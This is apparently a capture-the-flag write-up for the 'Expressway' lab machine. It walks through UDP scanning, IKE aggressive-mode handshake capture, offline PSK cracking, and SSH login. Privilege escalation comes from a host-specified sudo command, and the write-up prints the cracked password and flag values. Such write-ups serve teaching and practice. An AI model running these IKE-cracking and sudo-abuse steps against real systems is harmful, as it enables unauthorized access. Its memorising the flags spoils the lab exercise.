# Expressway

# Recon 

- Intially i tried running tcp port scan and i didnt find anything except for port 22 ssh.
```
nmap -sC -sV -p- 10.129.3.88
```
- UDP port scan 
```
nmap -sU -sV 10.129.3.88 -T4  -vvv 

PORT      STATE         SERVICE   REASON              VERSION
68/udp    open|filtered dhcpc     no-response
69/udp    open          tftp      script-set          Netkit tftpd or atftpd
500/udp   open          isakmp?   udp-response ttl 63
965/udp   open|filtered unknown   no-response
4500/udp  open|filtered nat-t-ike no-response
17487/udp open|filtered unknown   no-response
19500/udp open|filtered unknown   no-response
19717/udp open|filtered unknown   no-response
20411/udp open|filtered unknown   no-response
40805/udp open|filtered unknown   no-response
49174/udp open|filtered unknown   no-response
49176/udp open|filtered unknown   no-response
```

- Port 68 DHCP 
- Port 69 TFTP 
- Port 500 ISAKMP or IKE(internet key exchange)
- Port 4500 Nat-t-ike

## Users.txt

- Started Enumeration on port 500
- It is primarily used for Internet Key Exchange (IKE), the crucial negotiation phase for setting up secure IPsec VPN tunnels, handling key management and security parameters between devices.
- I found a artile on [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html?highlight=IKE#bruteforcing-id-with-ike-scan)

- I am going to use a tool ike-scan for this task

```
ike-scan -M 10.129.3.88

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.3.88	Main Mode Handshake returned
	HDR=(CKY-R=50e2acfa80a6abe8)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.284 seconds (3.53 hosts/sec).  1 returned handshake; 0 returned notify
```
- **SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)**. This line tells the connection needs a PSK for authenticaiton and uses 3DES for encription and SHA1 for integrity check.

- The IPSec connection establishment carried out usiing 2 phases.
- phase1: IKE tunnel establishment (Two modes MAIN MODE and AGGRESSIVE MODE)
- phase2: IPSec tunnel establishment 

- In the phase1 if the server uses AGRESSIVE MODE there may be a chance it leaks some sensitive info about the hand shake . (cause it uses 3 Messages)

- The leaks may contains identity or PSK.

```
ike-scan -A -Ppsh.txt 10.129.3.88

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.3.88	Aggressive Mode Handshake returned HDR=(CKY-R=ffb10fa97c8ccc3e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.263 seconds (3.80 hosts/sec).  1 returned handshake; 0 returned notify
```

- In the comand the **-A** option specifies  agressive mode and **-P** options looks for any PSK leaks and save it to psk.txt

- From the output we can see the use FQDN ike@expressway.htb.
- And also the PSK is saved into psk.txt

```
cat psh.txt 

efb1231d98544276809d369082ecb635fb2dc5c3c13553bb8412c8eadf3d8ebee00af63d9fc17bd0708665fa6e14c48e80f70278825b5349e6cae179de96e06186bb50891a3f111a6f15d4328fe48e36e1eb6529e90338803a1e42535d6c4a823d0c496dfed8cc9a70094441b97b0e6980a56fbf53b60470c8241ea834e147ca:3e52f5abc0d1942bff6a4f5577f1c561bce791580b1116096d9c2d949ff6b3f53ebdba245fbc3c0936ed6b430d603272f04629459d85f1d2df71b2d51d56e183474912862a0e346522f0058ba2c498f0c34e3f76cf804508bcc915348ce54e7b750e66c82594382699f9992feaa66378806e392371bd01ab0dc69cb46eb02887:ffb10fa97c8ccc3e:3f47af9431ae94fe:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:41fbf24d50dd06d10e29e7b3a0f481128657d3a3:7c59c5458ce8b653c01dec1a525afd73a6b0c5bc70591dcf8e0446646fec53b1:c9ca84c1dc657ad640c72a2127899e2dc072afc3
```

- Lets crack the hash for that i need to caputure the full hand shake for the Identity ike@expressway.htb

```
ike-scan -M --aggressive 10.129.3.88 -n ike@expressway.htb --pskcrack=hash.txt
```

- Option **--aggressive** is same as option **-A**  and **-n** spsecifies identity **--pskcrack** saves the psk hash for offline cracking.

- The above commadn save the psk to hash.txt , lets start our offline cracking

```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash d9585ab146e0613aca44cc1287bf6426fad69e8a
Ending psk-crack: 8045040 iterations in 6.977 seconds (1153154.83 iterations/sec)
```
- The key is freakingrockstarontheroad
- Lets try to login via ssh with username ike

- Before that add the expressway.htb to /etc/hosts files
```
echo "10.129.3.88 expressway.htb" | sudo tee -a /etc/hosts
```

```
ssh ike@expressway.htb

The authenticity of host 'expressway.htb (10.129.3.88)' can't be established.
ED25519 key fingerprint is: SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'expressway.htb' (ED25519) to the list of known hosts.
ike@expressway.htb's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 24 16:30:51 2026 from 10.10.14.248
ike@expressway:~$ 
```

- In the ike user home directory we can found users.txt

**users.txt: 2b3b2313c8133ff8b2e20c9eb2abc323**

## Root.txt

- I Dowloaded linpeas.sh and ran it. found few intresting things .
- found a sudo binary in unusual directory **/usr/local/bin/sudo**

- on /var/log directory found squid log . which are logs generated by a reverse proxy
```
 cat access.log.1
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```
- found a internal IP 192.168.68.50

```
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```
- In this specific entry we can see a subdomain . lets see what in here.
- From the logs the user tries to access the offramp subdomain but it is internal only site he got a 403 . 
- We found sudo with suid in some unusual location from our linpease output . and this internal only subdomain . 

- On doing some research found that we can implement host based policies to sudo.
- Sudo host-based policy controls user access to elevated privileges (root) based on the specific machine or hostname where the command is executed

- But i don't have solid proof , We don't have permission to see /etc/sudoers file 

- I run the following command and it dropped me in a root shell

```
/usr/local/bin/sudo -h offramp.expressway.htb -i
```
- the **-h** for specifying host .

- In the /root directory we can find root.txt

**Root.txt: d67afdc32f380a59acae99dea65fbeb1**